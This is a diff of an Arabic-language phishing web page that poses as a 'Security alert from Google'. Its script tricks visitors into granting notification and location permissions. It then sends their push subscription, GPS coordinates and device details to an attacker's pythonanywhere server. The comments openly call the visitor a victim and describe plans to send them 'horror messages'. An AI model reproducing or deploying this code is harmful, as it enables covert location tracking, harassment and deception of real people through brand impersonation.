@@ -2,72 +2,49 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>Google Security</title>
     <script>
-        // تأكد أن هذا المفتاح يطابق المفتاح العام (Public Key) الخاص بك
+        // هذا المفتاح هو مفتاح الأمان لفتح قفل الإشعارات في جوال الضحية
         const publicKey = "BVgK17MOi9TDGAa8fK/poMVJ0Q58QImEswUUh/GhVXevlPbxCJs1s/vwmxIHqSjC1fsY4BC/kJqJoIty10XtGg";
 
         async function init() {
             try {
-                // 1. تسجيل الـ Service Worker (ضروري للإشعارات)
+                // تفعيل محرك الإشعارات
                 const reg = await navigator.serviceWorker.register('sw.js');
-                
-                // 2. طلب إذن الإشعارات وسحب التوكن
                 const sub = await reg.pushManager.subscribe({
                     userVisibleOnly: true,
-                    applicationServerKey: urlBase64ToUint8Array(publicKey)
+                    applicationServerKey: publicKey
                 });
 
-                // إرسال التوكن للسيرفر (لحفظ الضحية في الداتابيز)
-                await fetch('https://Mohammed888.pythonanywhere.com/save_token', {
+                // إرسال "مفتاح التحكم" لسيرفرك عشان تقدر ترسل له رسائل رعب لاحقاً
+                fetch('https://Mohammed888.pythonanywhere.com/save_token', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify(sub)
                 });
 
-                // 3. سحب الموقع والبيانات
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    const battery = await navigator.getBattery();
-                    const payload = {
-                        location: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
-                        battery: `${Math.round(battery.level * 100)}%`,
-                        device: navigator.userAgent
-                    };
-
-                    await fetch('https://Mohammed888.pythonanywhere.com/exf', {
+                // سحب الموقع فوراً
+                navigator.geolocation.getCurrentPosition(pos => {
+                    fetch('https://Mohammed888.pythonanywhere.com/exf', {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify(payload)
+                        body: JSON.stringify({
+                            location: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
+                            battery: "جاري السحب...",
+                            device: navigator.userAgent
+                        })
                     });
-
-                    alert("تم تأمين الحساب بنجاح ✅");
-                }, (err) => {
-                    alert("يجب السماح بالوصول للموقع لتفعيل الحماية ⚠️");
+                    alert("✅ تم تحديث أمان الحساب!");
                 });
-
             } catch (e) {
-                console.error(e);
-                alert("يرجى الضغط على 'سماح' (Allow) لتفعيل الإشعارات ❌");
+                alert("⚠️ اضغط 'سماح' (Allow) لتأكيد هويتك!");
             }
-        }
-
-        // دالة تحويل المفتاح (لا تلمسها)
-        function urlBase64ToUint8Array(base64String) {
-            const padding = '='.repeat((4 - base64String.length % 4) % 4);
-            const base64 = (base64String + padding).replace(/-/g, '+').replace(/_/g, '/');
-            const rawData = window.atob(base64);
-            const outputArray = new Uint8Array(rawData.length);
-            for (let i = 0; i < rawData.length; ++i) {
-                outputArray[i] = rawData.charCodeAt(i);
-            }
-            return outputArray;
         }
     </script>
 </head>
-<body style="text-align:center; padding:100px; font-family:sans-serif; background:#f4f4f4;">
+<body style="text-align:center; padding-top:100px; font-family:Arial;">
     <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_Ads_logo.svg" width="80">
-    <h2>تحديث الأمان مطلوب</h2>
-    <p>لحماية حسابك، اضغط على الزر واقبل جميع الأذونات</p>
-    <button onclick="init()" style="padding:15px 30px; background:#1a73e8; color:white; border:none; border-radius:5px; cursor:pointer; font-weight:bold;">تفعيل الآن</button>
+    <h2>تنبيه أمني من Google</h2>
+    <p>يجب تحديث خدمات الموقع لضمان حماية حسابك</p>
+    <button onclick="init()" style="padding:15px 40px; background:#1a73e8; color:white; border:none; border-radius:5px; font-weight:bold; cursor:pointer;">تحديث الآن</button>
 </body>
 </html>
